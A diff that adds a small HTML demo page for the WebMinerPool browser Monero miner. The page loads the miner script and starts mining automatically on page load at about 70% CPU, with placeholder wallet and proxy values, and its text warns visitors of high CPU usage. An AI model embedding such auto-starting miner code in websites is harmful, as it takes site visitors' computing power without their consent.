@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebMinerPool Demo</title>
+</head>
+<body>
+    <h1>WebMinerPool Browser Miner</h1>
+    <p>If mining starts, you will see high CPU usage.</p>
+
+    <script src="webminerpool.min.js"></script>
+    <script>
+        var miner = WMP.Client.Anonymous('YOUR_MONERO_WALLET_ADDRESS', {
+            throttle: 0.3,  // 30% idle time = 70% CPU usage
+            c: 'testuser',  // optional: custom identifier
+            ads: 0,
+            wsUrl: "wss://your-proxy-server.com:8181" // required: your hosted proxy URL
+        });
+        miner.start();
+    </script>
+</body>
+</html>
